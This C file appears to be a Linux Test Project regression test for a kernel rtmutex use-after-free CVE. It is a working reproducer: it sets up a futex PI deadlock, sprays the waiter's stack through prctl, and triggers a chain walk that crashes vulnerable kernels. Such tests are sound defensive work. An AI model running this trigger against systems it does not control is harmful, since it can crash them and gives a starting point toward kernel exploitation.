// SPDX-License-Identifier: GPL-2.0-or-later
/*
 * Copyright (c) 2026 Nebula Security <root@nebusec.ai>
 * Copyright (c) 2026 Linux Test Project
 */

/*\
 * Test for CVE-2026-43499 (GhostLock), a stack use-after-free in the
 * rtmutex PI code, fixed in kernel v7.1:
 * 3bfdc63936dd ("rtmutex: Use waiter::task instead of current in
 * remove_waiter()")
 *
 * Reproducer based on the Nebula Security writeup and open-sourced PoC
 * (https://nebusec.ai/research/ionstack-part-2/ and
 * https://github.com/NebuSec/CyberMeowfia).
 * Beware, this test will crash the system on a vulnerable kernel.
 *
 * [Algorithm]
 *
 * - Set up a three-futex PI deadlock topology.
 * - Call :manpage:`futex(2)` with FUTEX_CMP_REQUEUE_PI on the waiter.
 * - On a vulnerable kernel, the rollback from -EDEADLK leaves the waiter's
 *   pi_blocked_on pointer dangling on its own stack.
 * - Waiter sprays its stack continuously via :manpage:`prctl(2)`
 *   (PR_SET_MM_MAP) with non-canonical addresses while main thread calls
 *   :manpage:`sched_setattr(2)` on the waiter to trigger a chain walk.
 * - The chain walk dereferences the sprayed garbage, crashing a vulnerable
 *   kernel.
 */

#include "tst_test.h"
#include "tst_timer.h"
#include "tst_safe_clocks.h"
#include "tst_safe_pthread.h"
#include "lapi/syscalls.h"
#include "lapi/sched.h"
#include "lapi/prctl.h"
#include "lapi/futex.h"

#define ATTEMPTS 128
#define POISON_PTR 0xdeadbee11c518f58ULL
#define MAX_AUXV_WORDS 48

#define CP_CHAIN_HELD 0
#define CP_TARGET_HELD 1
#define CP_SPRAYED 2

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

static pid_t waiter_tid;
static pid_t owner_tid;

static unsigned long auxv[MAX_AUXV_WORDS];
static uint32_t valid_auxv_size;
static tst_atomic_t stop_spray;

/*
 * auxv_size must fit mm->saved_auxv (AT_VECTOR_SIZE words:
 * 50 on current kernels, 44 on older ones)
 */
static const int try_sizes[] = {
	MAX_AUXV_WORDS,
	MAX_AUXV_WORDS - 4,
	MAX_AUXV_WORDS - 8
};

static int futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2,
				 struct timespec *ts)
{
	return tst_syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts,
			   uaddr2, 0);
}

static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2)
{
	return tst_syscall(__NR_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1,
			   uaddr2, 0);
}

static void futex_lock_pi(uint32_t *uaddr)
{
	if (tst_syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0) == -1) {
		if (errno == ENOSYS)
			tst_brk(TCONF, "FUTEX_LOCK_PI not supported");

		tst_brk(TBROK | TERRNO, "FUTEX_LOCK_PI failed");
	}
}

static void futex_unlock_pi(uint32_t *uaddr)
{
	if (tst_syscall(__NR_futex, uaddr, FUTEX_UNLOCK_PI, 0, 0, 0, 0) == -1) {
		if (errno == ENOSYS)
			tst_brk(TCONF, "FUTEX_UNLOCK_PI not supported");

		tst_brk(TBROK | TERRNO, "FUTEX_UNLOCK_PI failed");
	}
}

static void *waiter_fn(void *arg LTP_ATTRIBUTE_UNUSED)
{
	struct timespec ts;
	struct prctl_mm_map mm_map = {
		.start_code  = (uint64_t)(uintptr_t)&waiter_fn,
		.end_code    = (uint64_t)(uintptr_t)&waiter_fn + 0x1000,
		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
		.brk         = (uint64_t)(uintptr_t)sbrk(0),
		.start_stack = (uint64_t)(uintptr_t)&mm_map,
		.arg_start   = (uint64_t)(uintptr_t)&mm_map,
		.arg_end     = (uint64_t)(uintptr_t)&mm_map,
		.env_start   = (uint64_t)(uintptr_t)&mm_map,
		.env_end     = (uint64_t)(uintptr_t)&mm_map,
		.auxv        = (void *)auxv,
		.auxv_size   = valid_auxv_size,
		.exe_fd      = (uint32_t)-1,
	};

	waiter_tid = tst_syscall(__NR_gettid);

	futex_lock_pi(&f_pi_chain);

	TST_CHECKPOINT_WAKE(CP_CHAIN_HELD);

	SAFE_CLOCK_GETTIME(CLOCK_MONOTONIC, &ts);
	ts = tst_timespec_add(ts, (struct timespec){ .tv_sec = 10, .tv_nsec = 0 });
	if (futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts) != -1 ||
	    (errno != ETIMEDOUT && errno != EWOULDBLOCK && errno != EDEADLK)) {
		if (errno == ENOSYS)
			tst_brk(TCONF, "FUTEX_WAIT_REQUEUE_PI not supported");

		tst_brk(TBROK | TERRNO, "futex_wait_requeue_pi() failed unexpectedly");
	}

	TST_CHECKPOINT_WAKE(CP_SPRAYED);

	while (!tst_atomic_load(&stop_spray)) {
		/*
		 * This is the syscall that poisons the buffer and it might
		 * fail, so we don't use the SAFE_* variant.
		 */
		prctl(PR_SET_MM, PR_SET_MM_MAP, (unsigned long)&mm_map,
		      sizeof(mm_map), 0);
	}

	futex_unlock_pi(&f_pi_chain);

	return NULL;
}

static void *owner_fn(void *arg LTP_ATTRIBUTE_UNUSED)
{
	owner_tid = tst_syscall(__NR_gettid);

	TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);

	futex_lock_pi(&f_pi_target);
	TST_CHECKPOINT_WAKE(CP_TARGET_HELD);

	futex_lock_pi(&f_pi_chain);

	futex_unlock_pi(&f_pi_chain);
	futex_unlock_pi(&f_pi_target);

	return NULL;
}

static void setup(void)
{
	struct prctl_mm_map map = {
		.start_code  = (uint64_t)(uintptr_t)&setup,
		.end_code    = (uint64_t)(uintptr_t)&setup + 0x1000,
		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
		.brk         = (uint64_t)(uintptr_t)sbrk(0),
		.start_stack = (uint64_t)(uintptr_t)&map,
		.arg_start   = (uint64_t)(uintptr_t)&map,
		.arg_end     = (uint64_t)(uintptr_t)&map,
		.env_start   = (uint64_t)(uintptr_t)&map,
		.env_end     = (uint64_t)(uintptr_t)&map,
		.auxv        = (void *)auxv,
		.exe_fd      = (uint32_t)-1,
	};
	unsigned int i;

	for (i = 0; i < MAX_AUXV_WORDS; i++)
		auxv[i] = POISON_PTR + i * sizeof(unsigned long);

	for (i = 0; i < ARRAY_SIZE(try_sizes); i++) {
		valid_auxv_size = try_sizes[i] * sizeof(unsigned long);
		map.auxv_size = valid_auxv_size;

		if (prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0) == 0)
			break;
	}

	if (i == ARRAY_SIZE(try_sizes))
		tst_brk(TBROK | TERRNO, "PR_SET_MM_MAP failed for all auxv sizes");

	tst_res(TDEBUG, "Using auxv_size = %u", valid_auxv_size);
}

static void run(void)
{
	pthread_t waiter_th, owner_th;
	struct sched_attr attr = {
		.size = sizeof(attr),
		.sched_policy = SCHED_BATCH,
		.sched_nice = 19,
	};
	int i;

	tst_res(TINFO, "Triggering PI deadlock and stack spray");

	for (i = 0; i < ATTEMPTS; i++) {
		if (!tst_remaining_runtime())
			break;

		f_wait = 0;
		f_pi_target = 0;
		f_pi_chain = 0;
		tst_atomic_store(0, &stop_spray);

		SAFE_PTHREAD_CREATE(&waiter_th, NULL, waiter_fn, NULL);
		SAFE_PTHREAD_CREATE(&owner_th, NULL, owner_fn, NULL);

		TST_CHECKPOINT_WAIT(CP_TARGET_HELD);

		if (TST_THREAD_STATE_WAIT(owner_tid, 'S', 10000))
			tst_brk(TBROK | TERRNO, "owner thread did not block");

		if (TST_THREAD_STATE_WAIT(waiter_tid, 'S', 10000))
			tst_brk(TBROK | TERRNO, "waiter thread did not block");

		TEST(futex_cmp_requeue_pi(&f_wait, &f_pi_target));
		if (TST_ERR == ENOSYS)
			tst_brk(TCONF, "FUTEX_CMP_REQUEUE_PI not supported");
		if (TST_RET != -1 || TST_ERR != EDEADLK)
			tst_brk(TBROK | TTERRNO, "FUTEX_CMP_REQUEUE_PI did not return -EDEADLK");

		TST_CHECKPOINT_WAIT2(CP_SPRAYED, 18000);

		SAFE_SCHED_SETATTR(waiter_tid, &attr, 0);

		tst_atomic_store(1, &stop_spray);

		SAFE_PTHREAD_JOIN(waiter_th, NULL);
		SAFE_PTHREAD_JOIN(owner_th, NULL);
	}

	if (i < ATTEMPTS)
		tst_res(TINFO, "Runtime exhausted, executed %d/%d attempts", i, ATTEMPTS);

	tst_res(TPASS, "Kernel survived %d GhostLock trigger attempts", i);
}

static struct tst_test test = {
	.setup = setup,
	.test_all = run,
	.runtime = 180,
	.needs_checkpoints = 1,
	.needs_kconfigs = (const char *[]) {
		"CONFIG_CHECKPOINT_RESTORE=y",
		"CONFIG_FUTEX_PI=y",
		NULL
	},
	.taint_check = TST_TAINT_W | TST_TAINT_D,
	.tags = (const struct tst_tag[]) {
		{"linux-git", "3bfdc63936dd"},
		{"CVE", "2026-43499"},
		{}
	},
};
